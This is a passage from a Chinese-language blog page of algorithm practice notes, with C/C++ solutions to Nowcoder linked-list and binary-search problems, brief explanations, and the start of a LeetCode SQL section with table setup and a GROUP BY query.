pre<span class="operator">-</span><span class="operator">&gt;</span>next;</span><br><span class="line">            tmpCount <span class="operator">+</span><span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        struct ListNode<span class="operator">*</span> next;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j <span class="operator">=</span> <span class="number">0</span> ; j <span class="operator">&lt;</span> k; j <span class="operator">+</span><span class="operator">+</span>) &#123;</span><br><span class="line">            if (j <span class="operator">=</span><span class="operator">=</span> <span class="number">0</span>) &#123;</span><br><span class="line">                preHead <span class="operator">=</span> nextPreHead;</span><br><span class="line">                nextPreHead <span class="operator">=</span> cur;</span><br><span class="line">            &#125;</span><br><span class="line">            next <span class="operator">=</span> cur<span class="operator">-</span><span class="operator">&gt;</span>next;</span><br><span class="line">            cur<span class="operator">-</span><span class="operator">&gt;</span>next <span class="operator">=</span> pre;</span><br><span class="line">            pre <span class="operator">=</span> cur;</span><br><span class="line">            cur <span class="operator">=</span> next;</span><br><span class="line">        &#125;</span><br><span class="line">        if (<span class="keyword">left</span> <span class="operator">=</span><span class="operator">=</span> <span class="number">1</span>) &#123;</span><br><span class="line">            originHead <span class="operator">=</span> pre;</span><br><span class="line">        &#125;</span><br><span class="line">        if (preHead <span class="operator">!=</span> <span class="keyword">NULL</span>) &#123;</span><br><span class="line">            preHead<span class="operator">-</span><span class="operator">&gt;</span>next <span class="operator">=</span> pre;</span><br><span class="line">        &#125;</span><br><span class="line">        pre <span class="operator">=</span> cur;</span><br><span class="line">        <span class="keyword">left</span> <span class="operator">+</span><span class="operator">=</span> k;</span><br><span class="line">        <span class="keyword">right</span> <span class="operator">+</span><span class="operator">=</span> k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> originHead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h3 id="链表中环的入口结点"   >
          <a href="#链表中环的入口结点" class="heading-link"><i class="fas fa-link"></i></a><a href="#链表中环的入口结点" class="headerlink" title="链表中环的入口结点"></a>链表中环的入口结点</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221107203805285.png" alt="image-20221107203805285"></p>
<p>快慢指针，参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.nowcoder.com/practice/253d2c59ec3e4bc68da16833f79a38e4?tpId=295&tqId=23449&ru=/exam/oj&qru=/ta/format-top101/question-ranking&sourceUrl=/exam/oj" >链表中环的入口结点_牛客题霸_牛客网 (nowcoder.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<ul>
<li>快指针走两步，慢指针走一步，直至相遇</li>
<li>从相遇点和链表头部再出发，直至相遇，相遇点即为环入口点。</li>
</ul>
<figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">EntryNodeOfLoop</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">fast</span> =</span> head;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">low</span> =</span> head;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">originHead</span> =</span> head;</span><br><span class="line">        <span class="keyword">while</span>(fast&amp;&amp;fast-&gt;next)&#123;</span><br><span class="line">            fast = fast-&gt;next-&gt;next;</span><br><span class="line">            low = low-&gt;next;</span><br><span class="line">            <span class="keyword">if</span>(fast==low)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(fast == <span class="literal">NULL</span> <span class="keyword">or</span> fast-&gt;next == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (originHead != fast)&#123;</span><br><span class="line">            originHead = originHead-&gt;next;</span><br><span class="line">            fast = fast-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> originHead;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>




        <h3 id="删除链表的倒数第n个节点"   >
          <a href="#删除链表的倒数第n个节点" class="heading-link"><i class="fas fa-link"></i></a><a href="#删除链表的倒数第n个节点" class="headerlink" title="删除链表的倒数第n个节点"></a>删除链表的倒数第n个节点</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221108164412584.png" alt="image-20221108164412584"></p>
<p>快慢指针，记得记录<code>pre</code>节点</p>
<figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param pHead ListNode类</span></span><br><span class="line"><span class="comment">     * @param k int整型</span></span><br><span class="line"><span class="comment">     * @return ListNode类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">ListNode* <span class="title">removeNthFromEnd</span><span class="params">(ListNode* pHead, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">fast</span> =</span> pHead;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">pre</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">slow</span> =</span> pHead;</span><br><span class="line">        <span class="keyword">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (fast != <span class="literal">NULL</span> &amp;&amp; tmp != k)&#123;</span><br><span class="line">            fast = fast-&gt;next;</span><br><span class="line">            tmp += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(tmp != k)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (fast != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            fast = fast-&gt;next;</span><br><span class="line">            <span class="keyword">if</span>(pre == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                pre = slow;</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                pre = pre-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            slow = slow-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(pre == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> pHead-&gt;next;</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            pre-&gt;next = slow-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pHead;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>




        <h3 id="两个链表的第一个公共结点"   >
          <a href="#两个链表的第一个公共结点" class="heading-link"><i class="fas fa-link"></i></a><a href="#两个链表的第一个公共结点" class="headerlink" title="两个链表的第一个公共结点"></a>两个链表的第一个公共结点</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221108164039213.png" alt="image-20221108164039213"></p>
<p>计算长度，参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.nowcoder.com/practice/6ab1d9a29e88450685099d45c9e31e46?tpId=295&tqId=23257&ru=/exam/oj&qru=/ta/format-top101/question-ranking&sourceUrl=/exam/oj?fromPut=ad_baidu_sem_wushuang_bianchengtuoci0810_zaixianbiancheng&bd_vid=12203772359314211200" >两个链表的第一个公共结点_牛客题霸_牛客网 (nowcoder.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/36.gif" alt="36"></p>
<figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">FindFirstCommonNode</span><span class="params">( ListNode* pHead1, ListNode* pHead2)</span> </span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">originHead1</span> =</span> pHead1;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">originHead2</span> =</span> pHead2;</span><br><span class="line">        <span class="keyword">while</span>(pHead1 != pHead2)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pHead1 == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                pHead1 = originHead2;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				pHead1 = pHead1-&gt;next;</span><br><span class="line">			&#125;</span><br><span class="line">            <span class="keyword">if</span>(pHead2  == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                pHead2 = originHead1;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				pHead2 = pHead2-&gt;next;</span><br><span class="line">			&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pHead1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>




        <h3 id="链表的奇偶重排"   >
          <a href="#链表的奇偶重排" class="heading-link"><i class="fas fa-link"></i></a><a href="#链表的奇偶重排" class="headerlink" title="链表的奇偶重排"></a>链表的奇偶重排</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221108163852157.png" alt="image-20221108163852157"></p>
<p>分别简历奇偶链表然后串在一起，注意边界问题</p>
<figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param head ListNode类</span></span><br><span class="line"><span class="comment">     * @return ListNode类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">ListNode* <span class="title">oddEvenList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">NULL</span> || head-&gt;next == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode* oddHead = head;</span><br><span class="line">        ListNode* evenHead = head-&gt;next;</span><br><span class="line">        ListNode* originOddHead = head;</span><br><span class="line">        ListNode* originEvenHead = evenHead;</span><br><span class="line">        <span class="keyword">while</span>(oddHead-&gt;next != <span class="literal">NULL</span> &amp;&amp; evenHead-&gt;next != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            oddHead-&gt;next = oddHead-&gt;next-&gt;next;</span><br><span class="line">            oddHead = oddHead-&gt;next;</span><br><span class="line">            evenHead-&gt;next = evenHead-&gt;next-&gt;next;</span><br><span class="line">            evenHead = evenHead-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        oddHead-&gt;next = originEvenHead;</span><br><span class="line">        <span class="keyword">return</span> originOddHead;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>




        <h3 id="删除有序链表中重复的元素-II"   >
          <a href="#删除有序链表中重复的元素-II" class="heading-link"><i class="fas fa-link"></i></a><a href="#删除有序链表中重复的元素-II" class="headerlink" title="删除有序链表中重复的元素-II"></a>删除有序链表中重复的元素-II</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221109162359368.png" alt="image-20221109162359368"></p>
<ul>
<li><p>预先确定一个头节点<code>preHead</code>以及<code>pre</code>和<code>cur</code>节点，逐次遍历</p>
<figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">preHead = preHead-&gt;next;</span><br><span class="line">cur = cur-&gt;next;</span><br><span class="line">pre = pre-&gt;next;</span><br></pre></td></tr></table></div></figure></li>
<li><p>然后挨个删除重复节点</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if( cur-&gt;val == pre-&gt;val)&#123;</span><br><span class="line">    tmp = cur-&gt;val;</span><br><span class="line">    preHead-&gt;next = pre-&gt;next;</span><br><span class="line">    pre = pre-&gt;next;</span><br><span class="line">    cur = cur-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
<li><p>当碰到不同节点时，判断<code>pre</code>节点是否和存储的重复节点值相等，如果相当，那么<code>pre</code>节点也需要删除</p>
<figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(pre-&gt;val == tmp)&#123;</span><br><span class="line">    preHead-&gt;next = cur;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
</ul>
<p>需要最后<code>cur</code>为NULL时，如果最后一个也需要删除，那么此时由于<code>cur</code>为NULL，所以无法进入<code>while</code>循环中，无法删除，需要在<code>while</code>循环外部进行判断</p>
<figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(pre-&gt;val == tmp)&#123;</span><br><span class="line">    preHead-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>最终结果</p>
<figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param head ListNode类</span></span><br><span class="line"><span class="comment">     * @return ListNode类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteDuplicates</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">NULL</span> || head-&gt;next == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">preHead</span> =</span> (struct ListNode*) <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">originPreHead</span> =</span> preHead;</span><br><span class="line">        preHead-&gt;next = head;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">pre</span> =</span> head;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">cur</span> =</span> head-&gt;next;</span><br><span class="line">        <span class="keyword">int</span> tmp;</span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>( cur-&gt;val == pre-&gt;val)&#123;</span><br><span class="line">                tmp = cur-&gt;val;</span><br><span class="line">                preHead-&gt;next = pre-&gt;next;</span><br><span class="line">                pre = pre-&gt;next;</span><br><span class="line">                cur = cur-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(pre-&gt;val == tmp)&#123;</span><br><span class="line">                    preHead-&gt;next = cur;</span><br><span class="line">                &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                    preHead = preHead-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">                cur = cur-&gt;next;</span><br><span class="line">                pre = pre-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(pre-&gt;val == tmp)&#123;</span><br><span class="line">            preHead-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> originPreHead-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>


        <h2 id="查找与排序"   >
          <a href="#查找与排序" class="heading-link"><i class="fas fa-link"></i></a><a href="#查找与排序" class="headerlink" title="查找与排序"></a>查找与排序</h2>
      
        <h3 id="二分查找-2"   >
          <a href="#二分查找-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#二分查找-2" class="headerlink" title="二分查找"></a>二分查找</h3>
      <p>注意边界性问题</p>
<figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsLen, <span class="keyword">int</span> target )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> l = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> r = numsLen - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> mid = (l + r)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">while</span>(r &gt;= l)&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[mid] == target)&#123;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(nums[mid] &lt; target)&#123;</span><br><span class="line">            l = mid + <span class="number">1</span>;</span><br><span class="line">            mid = (mid+<span class="number">1</span> + r) / <span class="number">2</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            r = mid - <span class="number">1</span>;</span><br><span class="line">            mid = (l + mid<span class="number">-1</span>) / <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="寻找峰值"   >
          <a href="#寻找峰值" class="heading-link"><i class="fas fa-link"></i></a><a href="#寻找峰值" class="headerlink" title="寻找峰值"></a>寻找峰值</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221109192943739.png" alt="image-20221109192943739"></p>
<p>采用二分查找，依据<code>mid</code>来更改<code>right</code>和<code>left</code>缩小范围，直至找到峰值</p>
<figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param nums int整型vector</span></span><br><span class="line"><span class="comment">     * @return int整型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findPeakElement</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> r = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(l &lt; r)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = (l + r)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &gt; nums[mid+<span class="number">1</span>])&#123;</span><br><span class="line">                r = mid;</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                l = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> l;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>




        <h1 id="数据库"   >
          <a href="#数据库" class="heading-link"><i class="fas fa-link"></i></a><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1>
      <p>例题均来源于<code>Leetcode</code></p>

        <h2 id="游戏玩法分析I"   >
          <a href="#游戏玩法分析I" class="heading-link"><i class="fas fa-link"></i></a><a href="#游戏玩法分析I" class="headerlink" title="游戏玩法分析I"></a>游戏玩法分析I</h2>
      <p>创建语句</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> If <span class="keyword">Not</span> <span class="keyword">Exists</span> Activity (player_id <span class="type">int</span>, device_id <span class="type">int</span>, event_date <span class="type">date</span>, games_played <span class="type">int</span>);</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Activity;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (player_id, device_id, event_date, games_played) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2016-03-01&#x27;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (player_id, device_id, event_date, games_played) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2016-05-02&#x27;</span>, <span class="string">&#x27;6&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (player_id, device_id, event_date, games_played) <span class="keyword">values</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2017-06-25&#x27;</span>, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (player_id, device_id, event_date, games_played) <span class="keyword">values</span> (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2016-03-02&#x27;</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (player_id, device_id, event_date, games_played) <span class="keyword">values</span> (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;2018-07-03&#x27;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221103160948765.png" alt="image-20221103160948765"></p>

        <h3 id="知识点："   >
          <a href="#知识点：" class="heading-link"><i class="fas fa-link"></i></a><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3>
      
        <h4 id="group聚合"   >
          <a href="#group聚合" class="heading-link"><i class="fas fa-link"></i></a><a href="#group聚合" class="headerlink" title="group聚合"></a>group聚合</h4>
      <p>基于<code>group by</code>之后的列字段进行相同值的聚合，当查询多个列时，通常需要进行排序，所以也需要对相关数据进行值判定</p>

        <h3 id="代码："   >
          <a href="#代码：" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码：" class="headerlink" title="代码："></a>代码：</h3>
      <figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    player_id,</span><br><span class="line">    <span class="built_in">min</span>(event_date) first_login</span><br><span class="line"><span class="keyword">FROM</span> Activity</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> player_id</span><br></pre></td></tr></table></div></figure>


        <h2 id="寻找用户推荐人"   >
          <a href="#寻找用户推荐人" class="heading-link"><i class="fas fa-link"></i></a><a href="#寻找用户推荐人" class="headerlink" title="寻找用户推荐人"></a>寻找用户推荐人</h2>
      <p>创建语句：</p>
